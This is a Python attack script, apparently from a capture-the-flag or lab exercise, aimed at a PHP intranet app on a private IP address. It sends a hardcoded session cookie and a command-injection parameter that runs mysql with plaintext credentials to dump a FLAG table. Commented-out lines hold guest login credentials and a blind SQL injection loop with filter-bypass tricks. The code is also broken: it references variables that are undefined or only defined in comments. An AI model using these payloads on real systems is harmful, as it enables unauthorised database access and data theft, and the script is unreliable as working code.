import requests

import logging

# # These two lines enable debugging at httplib level (requests->urllib3->http.client)
# # You will see the REQUEST, including HEADERS and DATA, and RESPONSE with HEADERS but without DATA.
# # The only thing missing will be the response.body which is not logged.
# try:
#     import http.client as http_client
# except ImportError:
#     # Python 2
#     import httplib as http_client
# http_client.HTTPConnection.debuglevel = 1

# # You must initialize logging, otherwise you'll not see debug output.logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.setLevel(logging.DEBUG)
requests_log.propagate = True

s = requests.Session()
headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": "PHPSESSID=1ojjkke8957bqjdh9l96spap55; user=mabene",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
        }
#perams = {"cert":"no; mysql -u intranetuser -p jhEGRh9BtbwSz4SF; mysql use intranet; mysql show tables"}
#perams = {"cert":"no; mysql -u intranetuser -p jhEGRh9BtbwSz4SF --database=intranet -e 'select *'"}
#perams = {"cert":"no; mysql -u intranetuser -p jhEGRh9BtbwSz4SF --database=intranet - 'show tables;'"}
parameter = {"cert":"no; mysql -u intranetuser -pjhEGRh9BtbwSz4SF --database=intranet  -e 'SELECT * FROM FLAG;'"}


#r = s.post('http://192.168.0.33/login.php', data = {'username': 'guest', 'password': 'DMGuestIntra'})
#print(r.headers)

ans = ""

for y in range(1,100):
   for x in range(0,256):        

        #r2 = s.get('http://192.168.0.33/index.php?id=1/**/AND/**/ascii(substring((SELselectECT/**/name/**/FROM/**/users/**/LIMIT/**/0,1),'+str(y)+',1))='+str(x)+'', headers = headers)
        r3 = s.get('http://192.168.0.33/index.php?id=1', params=perams, headers = headers)
        print(r3.text)
        exit()
        #print(r2.request.headers)
	#print(r2.text)
        if "<h2>" in r2.text:
            ans += str(unichr(x))
            print(ans + "\n\n\n\n\n")
            
        	#print(r2.text)
